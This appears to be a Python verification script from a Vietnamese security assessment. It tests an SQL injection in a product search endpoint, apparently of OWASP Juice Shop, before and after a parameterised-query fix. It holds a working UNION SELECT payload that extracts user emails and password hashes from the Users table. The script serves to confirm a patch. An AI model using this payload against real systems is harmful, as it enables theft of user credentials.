"""TV2 — F02 SQL injection ở tìm kiếm sản phẩm (GET /rest/products/search?q=).

Phát hiện: Semgrep báo `express-sequelize-injection` tại `search.ts` (ghép thẳng tham số q vào câu SQL).
Khai thác: payload UNION SELECT trích bảng Users -> lộ email + hash mật khẩu của mọi người dùng.
Sau vá (truy vấn tham số): payload chỉ được coi là chuỗi tìm kiếm -> không trích được bảng khác.
"""
from urllib.parse import quote
from common import AFTER, BEFORE, call, table

# UNION SELECT khớp số cột của bảng Products rồi đổ cột email + hash của bảng Users ra kết quả tìm kiếm
UNION = "qwert')) UNION SELECT id,email,password,role,1,2,3,4,5 FROM Users--"


def leaked_accounts(data):
    return [r for r in data if isinstance(r, dict) and '@' in str(r.get('name', ''))]


rows = [('Môi trường', 'Yêu cầu', 'HTTP', 'Kết quả', 'Kết luận')]
for label, base in (BEFORE, AFTER):
    s, body = call(base, 'GET', '/rest/products/search?q=apple')
    n = len(body.get('data', [])) if isinstance(body, dict) else 0
    rows.append((label, 'tìm "apple" (hợp lệ)', s, f'{n} sản phẩm', 'chức năng bình thường'))

    s, body = call(base, 'GET', '/rest/products/search?q=' + quote(UNION))
    data = body.get('data', []) if isinstance(body, dict) else []
    hit = leaked_accounts(data)
    rows.append((label, 'payload UNION SELECT ... FROM Users', s,
                 f'{len(hit)} email+hash người dùng' if hit else '0 dữ liệu người dùng',
                 'LỖ HỔNG: lộ toàn bộ tài khoản' if hit else 'an toàn: không trích được bảng khác'))
table(rows)
